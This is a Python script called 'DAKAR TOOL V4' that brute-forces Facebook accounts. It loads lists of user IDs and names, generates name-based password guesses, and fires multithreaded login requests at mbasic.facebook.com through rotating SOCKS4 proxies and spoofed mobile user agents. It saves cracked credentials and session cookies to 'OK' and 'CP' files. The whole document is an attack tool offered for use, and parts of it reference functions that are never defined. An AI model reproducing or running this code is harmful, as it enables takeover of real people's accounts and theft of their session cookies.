import os
import requests
import os
import random
import re
import requests
import sys
import time
import json
import datetime
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
import uuid
import os
import sys
import random
import re
import requests
from concurrent.futures import ThreadPoolExecutor as tred
import time
pretty.install()
CON = sol()
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []

try:
    prox = requests.get('https://github.com/DFD4x/DFD-IP.txt').text
    with open('.DFD-IP.txt', 'w') as file:
        file.write(prox)
except Exception as e:
    print('')
prox = open('.DFD-IP.txt', 'r').read().splitlines()

for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'
    ugen2.append(uaku)

for x in range(10):
    a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b = random.randrange(100, 9999)
    c = random.randrange(100, 9999)
    d = random.choice(['A','B', 'C', 'D', 'E', 'F'])
    e = random.choice(['A','B', 'C', 'D', 'E', 'F'])
    f = random.choice(['A','B', 'C', 'D', 'E', 'F'])
    g = random.choice(['A','B', 'C', 'D', 'E', 'F'])
    h = random.randrange(1, 9)
    i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/3.0 Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    uak = f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k}'
    ugen.append(uak)

def uaku():
    try:
        ua = open('DFD-MOBILE.txt', 'r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a = requests.get('https://github.com/DAKARC/DFD-MOBILE.txt').text
        ua = open('.DFD-MOBILE.txt', 'w')
        aa = re.findall('line">(.*?)<', str(a))
        for un in aa:
            ua.write(un + '\n')
        ua = open('.DFD-MOBILE.txt', 'r').read().splitlines()
id, id2, loop, ok, cp, akun, oprek, method, lisensiku = [], [], 0, 0, 0, 0, 0, [], ""
cokbrut = []
pwpluss, pwnya = [], []
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m'
kk = '\033[33m'
b = '\33[1;96m'
p = '\x1b[0;34m'
asu = random.choice([m, k, h, u, b])
dic = {'1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June', '7': 'July', '8': 'August', '9': 'September', '10': 'October', '11': 'November', '12': 'December'}
dic2 = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July', '08': 'August', '09': 'September', '10': 'October', '11': 'November', '12': 'December'}

tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def masud(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)

def clear():
    os.system('clear')

def back():
    login()

def banner():
    clear()
    print(f"""
\x1b[1;34m
  /$$$$$$            /$$ /$$         /$$     /$$
 /$$__  $$          | $$| $$        |  $$   /$$/
/$$  \__/  /$$$$$$ | $$| $$  /$$$$$$\  $$ /$$/
|  $$$$$$  |____  $$| $$| $$ |____  $$\  $$$$/
 \____  $$  /$$$$$$$| $$| $$  /$$$$$$$ \  $$/
 /$$  \ $$ /$$__  $$| $$| $$ /$$__  $$  | $$
|  $$$$$$/|  $$$$$$$| $$| $$|  $$$$$$$  | $$
 \______/  \_______/|__/|__/ \_______/  |__/
                  WELCOME TO TOOL DAKAR
                  \033[0;32mDAKAR TOOL V4

\033[0;33m oooooooooooooooooooooooooooooooooooooo
\033[0;34m╔══\033[0;32m[•] OWNER         \033[0;34m
\033[0;34m╠══\033[0;91m[•] CH            \033[0;34m
\033[0;34m╚══\033[0;32m[•] BRO           \033[0;34m
""")

def login():
    clear()
    banner()
    uuid = str(os.getpid()) + str(os.getlogin())
    id = "".join(uuid)

    print("")
    print('\033[1;33m~~~~~~~~~~Menu Cracking~~~~~~~~~~')
    print('\033[1;34m\033[1;36m[DAKAR] [FILE]')
    print('\033[1;34m\033[1;36m[DAKAR] [EXIT]')
    print('\033[1;33m~~~~~~~~~~Menu Cracking~~~~~~~~~~')
    dark = input('\033[1;36m└\033[1;32m[Choose]: ')
    print('')
    if dark in ['1', '01']:
        crack_file()
    elif dark in ['0', '00']:
        print(' [OK] LOGIN ACCOUNT ')
        exit()

def crack_file():
    o = input('\033[1;36m└\033[1;32m[DAKAR] [File]: ')
    print('')

    try:
        lin = open(o).read().splitlines()
    except:
        print('File Not Found')
        time.sleep(2)
        menu()

    for xid in lin:
        id.append(xid)
    setting()

def setting():
    banner()
    print(' \033[1;36m└\033[1;32m[DAKAR] [TOTAL: %s]' % str(len(id)))
    print("")
    if ['1', '01']:
        os.system('1')
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        print('\n\n')
        exit()
    banner()
    print('[01] WI-FI 2G 3G 4G 5G ')
    print("")
    method.append('mobile')
    banner()
    print("""
    \033[1;36m└\033[1;32m[DAKAR] \033[1;33m└[Method 1]
    \033[1;36m└\033[1;32m[DAKAR] \033[1;36m└[Method 2]
    """)
    dark = input(' \033[1;36m└\033[1;32m[DAKAR] [Choose]: ')
    if dark in ['01', '1']:
        passwrd()
    if dark in ['02', '2']:
        passwrd3()
    exit()

def passwrd():
    banner()
    print("")
    with ThreadPoolExecutor(max_workers=50) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1]
            frs = nmf.split(' ')[0]
            pwv = []
            if len(frs) == 3 or len(frs) == 4:
                pwv.append(nmf)
                pwv.append("07700770")
                pwv.append("07500750")
                pwv.append(frs + '123')
                pwv.append(frs + frs)
                pwv.append(frs + '2022')
                pwv.append(frs + '123123')
                pwv.append(frs + '112233')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456789')
                pwv.append(frs + '123321')
                pwv.append(frs + '2000')
                pwv.append(frs + '0000')
                pwv.append(frs + '0750')
                pwv.append(frs + '0770')
                pwv.append(frs + '1212')
                pwv.append(frs + '123@')
                pwv.append(frs + '@123')
                pwv.append(frs + '12345678')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')
            else:
                pwv.append(nmf)
                pwv.append("07700770")
                pwv.append("07500750")
                pwv.append(frs + '123')
                pwv.append(frs + frs)
                pwv.append(frs + '2022')
                pwv.append(frs + '123123')
                pwv.append(frs + '112233')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456789')
                pwv.append(frs + '123321')
                pwv.append(frs + '2000')
                pwv.append(frs + '0000')
                pwv.append(frs + '0750')
                pwv.append(frs + '0770')
                pwv.append(frs + '1212')
                pwv.append(frs + '123@')
                pwv.append(frs + '@123')
                pwv.append(frs + '12345678')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')

            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
                pool.submit(crackmbasic, idf, pwv)
    print('')
    exit()

def passwrd1():
    os.system('clear')
    banner()
    print("")
    with ThreadPoolExecutor(max_workers=25) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1]
            frs = nmf.split(' ')[0]
            pwv = []
            if len(frs) == 3 or len(frs) == 4:
                pwv.append(nmf)
                pwv.append("07700770")
                pwv.append("07500750")
                pwv.append(frs + '123')
                pwv.append(frs + frs)
                pwv.append(frs + '2022')
                pwv.append(frs + '123123')
                pwv.append(frs + '112233')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456789')
                pwv.append(frs + '123321')
                pwv.append(frs + '2000')
                pwv.append(frs + '0000')
                pwv.append(frs + '0750')
                pwv.append(frs + '0770')
                pwv.append(frs + '1212')
                pwv.append(frs + '123@')
                pwv.append(frs + '@123')
                pwv.append(frs + '12345678')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')
            else:
                pwv.append(nmf)
                pwv.append("07700770")
                pwv.append("07500750")
                pwv.append(frs + '123')
                pwv.append(frs + frs)
                pwv.append(frs + '2022')
                pwv.append(frs + '123123')
                pwv.append(frs + '112233')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456789')
                pwv.append(frs + '123321')
                pwv.append(frs + '2000')
                pwv.append(frs + '0000')
                pwv.append(frs + '0750')
                pwv.append(frs + '0770')
                pwv.append(frs + '1212')
                pwv.append(frs + '123@')
                pwv.append(frs + '@123')
                pwv.append(frs + '12345678')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')

            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:
                pass
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
                pool.submit(crackmbasic, idf, pwv)
    print('')
    exit()

def passwrd2():
    os.system('clear')
    banner()
    print("")
    with ThreadPoolExecutor(max_workers=20) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1]
            frs = nmf.split(' ')[0]
            pwv = []
            if len(frs) == 3 or len(frs) == 4:
                pwv.append(nmf)
                pwv.append(nmf)
            else:
                pwv.append(nmf)
                pwv.append(nmf)
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:
                pass
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
                pool.submit(crackmbasic, idf, pwv)
    print('')
    exit()

def passwrd3():
    os.system('clear')
    banner()
    print("")
    with ThreadPoolExecutor(max_workers=25) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1]
            frs = nmf.split(' ')[0]
            pwv = []
            if len(frs) == 3 or len(frs) == 4:
                pwv.append(nmf)
                pwv.append("07700770")
                pwv.append("07500750")
                pwv.append(frs + '123')
                pwv.append(frs + frs)
                pwv.append(frs + '2022')
                pwv.append(frs + '123123')
                pwv.append(frs + '112233')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456789')
                pwv.append(frs + '123321')
                pwv.append(frs + '2000')
                pwv.append(frs + '0000')
                pwv.append(frs + '0750')
                pwv.append(frs + '0770')
                pwv.append(frs + '1212')
                pwv.append(frs + '123@')
                pwv.append(frs + '@123')
                pwv.append(frs + '12345678')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')
            else:
                pwv.append(nmf)
                pwv.append("07700770")
                pwv.append("07500750")
                pwv.append(frs + '123')
                pwv.append(frs + frs)
                pwv.append(frs + '2022')
                pwv.append(frs + '123123')
                pwv.append(frs + '112233')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456789')
                pwv.append(frs + '123321')
                pwv.append(frs + '2000')
                pwv.append(frs + '0000')
                pwv.append(frs + '0750')
                pwv.append(frs + '0770')
                pwv.append(frs + '1212')
                pwv.append(frs + '123@')
                pwv.append(frs + '@123')
                pwv.append(frs + '12345678')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:
                pass
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
                pool.submit(crackmbasic, idf, pwv)
    print('')
    exit()

def passwrd4():
    os.system('clear')
    banner()
    print("")
    with ThreadPoolExecutor(max_workers=25) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1]
            frs = nmf.split(' ')[0]
            pwv = []
            if len(frs) == 3 or len(frs) == 4:
                pwv.append(nmf)
                pwv.append("07700770")
                pwv.append("07500750")
                pwv.append(frs + '123')
                pwv.append(frs + frs)
                pwv.append(frs + '2022')
                pwv.append(frs + '123123')
                pwv.append(frs + '112233')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456789')
                pwv.append(frs + '123321')
                pwv.append(frs + '2000')
                pwv.append(frs + '0000')
                pwv.append(frs + '0750')
                pwv.append(frs + '0770')
                pwv.append(frs + '1212')
                pwv.append(frs + '123@')
                pwv.append(frs + '@123')
                pwv.append(frs + '12345678')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')
            else:
                pwv.append(nmf)
                pwv.append("07700770")
                pwv.append("07500750")
                pwv.append(frs + '123')
                pwv.append(frs + frs)
                pwv.append(frs + '2022')
                pwv.append(frs + '123123')
                pwv.append(frs + '112233')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456789')
                pwv.append(frs + '123321')
                pwv.append(frs + '2000')
                pwv.append(frs + '0000')
                pwv.append(frs + '0750')
                pwv.append(frs + '0770')
                pwv.append(frs + '1212')
                pwv.append(frs + '123@')
                pwv.append(frs + '@123')
                pwv.append(frs + '12345678')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:
                pass
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
                pool.submit(crackmbasic, idf, pwv)
    print('')
    exit()

def passwrd5():
    os.system('clear')
    banner()
    print("")
    with tred(max_workers=25) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong
            frs = nmf.split(' ')[0]
            pwv = []
            if len(frs) == 3 or len(frs) == 4:
                pwv.append(nmf)
                pwv.append("07700770")
                pwv.append("07500750")
                pwv.append(frs + '123')
                pwv.append(frs + frs)
                pwv.append(frs + '123')
                pwv.append(frs + '2022')
                pwv.append(frs + '123123')
                pwv.append(frs + '112233')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456789')
                pwv.append(frs + '112233')
                pwv.append(frs + '123123')
                pwv.append(frs + '123321')
                pwv.append(frs + '2000')
                pwv.append(frs + '0000')
                pwv.append(frs + '0750')
                pwv.append(frs + '0770')
                pwv.append(frs + '1212')
                pwv.append(frs + '123123')
                pwv.append(frs + '123@')
                pwv.append(frs + '@123')
                pwv.append(frs + '12345678')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')
            else:
                pwv.append(nmf)
                pwv.append("07700770")
                pwv.append("07500750")
                pwv.append(frs + '123')
                pwv.append(frs + frs)
                pwv.append(frs + '123')
                pwv.append(frs + '2022')
                pwv.append(frs + '123123')
                pwv.append(frs + '112233')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456789')
                pwv.append(frs + '112233')
                pwv.append(frs + '123123')
                pwv.append(frs + '123321')
                pwv.append(frs + '2000')
                pwv.append(frs + '0000')
                pwv.append(frs + '0750')
                pwv.append(frs + '0770')
                pwv.append(frs + '1212')
                pwv.append(frs + '123123')
                pwv.append(frs + '123@')
                pwv.append(frs + '@123')
                pwv.append(frs + '12345678')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
                pool.submit(crackmbasic, idf, pwv)
    print('')
    exit()

def passwrd7():
    os.system('clear')
    banner()
    print("")
    with tred(max_workers=25) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong
            frs = nmf.split(' ')[0]
            pwv = []
            if len(frs) == 3 or len(frs) == 4:
                pwv.append(nmf)
                pwv.append("07700770")
                pwv.append("07500750")
                pwv.append(frs + '123')
                pwv.append(frs + frs)
                pwv.append(frs + '123')
                pwv.append(frs + '2022')
                pwv.append(frs + '123123')
                pwv.append(frs + '112233')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456789')
                pwv.append(frs + '112233')
                pwv.append(frs + '123123')
                pwv.append(frs + '123321')
                pwv.append(frs + '2000')
                pwv.append(frs + '0000')
                pwv.append(frs + '0750')
                pwv.append(frs + '0770')
                pwv.append(frs + '1212')
                pwv.append(frs + '123123')
                pwv.append(frs + '123@')
                pwv.append(frs + '@123')
                pwv.append(frs + '12345678')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')
            else:
                pwv.append(nmf)
                pwv.append("07700770")
                pwv.append("07500750")
                pwv.append(frs + '123')
                pwv.append(frs + frs)
                pwv.append(frs + '123')
                pwv.append(frs + '2022')
                pwv.append(frs + '123123')
                pwv.append(frs + '112233')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456789')
                pwv.append(frs + '112233')
                pwv.append(frs + '123123')
                pwv.append(frs + '123321')
                pwv.append(frs + '2000')
                pwv.append(frs + '0000')
                pwv.append(frs + '0750')
                pwv.append(frs + '0770')
                pwv.append(frs + '1212')
                pwv.append(frs + '123123')
                pwv.append(frs + '123@')
                pwv.append(frs + '@123')
                pwv.append(frs + '12345678')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
                pool.submit(crackmbasic, idf, pwv)
    print('')
    exit()
def crack(idf, pwv):
    global loop, ok, cp
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f"\r \033[1;36m└[{loop}]\033[0m")
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {'http': 'socks4://' + nip}
            ses.headers.update({
                'authority': 'mbasic.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'referer': 'https://www.google.com/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"', 
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"', 
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua  
            })
            p = ses.get('https://mbasic.facebook.com')
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', p.text).group(1)}  
            koki = (";").join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])  
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {"Host": 'mbasic.facebook.com'}
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/', data=dataa, headers=heade, proxies=proxs)
            if "checkpoint" in po.cookies.get_dict():
                print(f'\r\033[1;36m└[ DAKAR🤢 CP ]\033[0m {idf}|{pw}')
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                cp += 1
                break
            elif "c_user" in ses.cookies.get_dict():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join([f"{key}={value}" for key, value in coki.items()])
                print(f'\r\033[1;32m└[ DAKAR🤩 OK ]\033[0m {idf}|{pw}|{kuki}')
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                break
            elif "c_user" in po.cookies.get_dict():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join([f"{key}={value}" for key, value in coki.items()])
                print(f'\r\033[1;32m└[ DAKAR✅OK ]\033[0m {idf}|{pw}|{kuki}')
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

if __name__ == '__main__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('data')
    except:pass
    try:os.system('touch DAKAR-IP.txt')
    except:pass
    try:os.system('touch DAKAR-IP.txt')
    except:pass
    login()